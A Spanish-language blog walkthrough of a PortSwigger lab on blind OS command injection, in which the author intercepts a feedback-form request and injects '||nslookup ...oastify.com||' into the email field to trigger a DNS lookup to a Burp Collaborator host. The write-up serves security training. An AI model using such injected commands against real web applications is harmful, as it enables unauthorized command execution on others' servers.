---
title: "Blind OS command injection with out-of-band interaction"
description: "Laboratorio de Portswigger sobre OS Command Injection"
date: 2024-12-01 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - OS Command Injection
tags:
  - OS Command Injection
  - Blind OS command injection with out-of-band interaction
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `Blind OS Command Injection` en la `función` de `comentarios`. La aplicación `ejecuta` un `comando` en la `terminal` que incluye `datos` proporcionados por el `usuario`. El `comando` se ejecuta de forma `asíncrona` y no tiene efecto en la `respuesta` de la aplicación. No es posible `redireccionar` la `salida` a una `ubicación` accesible. Sin embargo, podemos desencadenar `out-of-band interactions` con un `dominio externo`. Para resolver el `laboratorio`, debemos explotar la `vulnerabilidad` para realizar una `consulta DNS` a `Burp Collaborator`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/OS-Command-Injection-Lab-4/image_1.png)

Pulsamos en `Submit feedback` y vemos un `formulario`

![](/assets/img/OS-Command-Injection-Lab-4/image_2.png)

Hacemos `click` sobre `Submit feedback` y `capturamos` la `petición` con `Burpsuite`

![](/assets/img/OS-Command-Injection-Lab-4/image_3.png)

La `respuesta` obtenida son unas `llaves vacías {}`

![](/assets/img/OS-Command-Injection-Lab-4/image_4.png)

Nos dirigimos a `Burpsuite Collaborator` hacemos `click` en `Copy to clipboard`, debido a que no recibimos `ninguna respuesta` que indique que estamos `inyectando comandos`, esta es la única forma que podemos utilizar para ello, debemos usar este `payload` en los diferentes `campos` para ver si son `inyectables`

```
csrf=zRp2nJC1bIBQPQcICpkP7l9cHlAfYlE8&name=test&email=||nslookup+t712dnvp65v6mtbksuisdlxe95fw3rrg.oastify.com||&subject=test&message=test
```

Si nos vamos a `Burpsuite Collaborator` nuevamente veremos que hemos obtenido `dos peticiones DNS`

![](/assets/img/OS-Command-Injection-Lab-4/image_5.png)
